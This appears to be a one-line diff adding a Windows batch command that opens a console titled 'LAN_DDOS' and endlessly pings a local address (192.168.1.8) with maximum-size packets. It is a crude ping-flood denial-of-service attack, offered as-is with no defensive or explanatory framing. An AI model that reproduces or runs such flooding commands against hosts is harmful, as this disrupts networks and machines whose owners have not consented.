@@ -1,0 +1,1 @@
+start cmd.exe /k "title LAN_DDOS & ping 192.168.1.8 -t -l 65500 -w 1000000 -i 255"
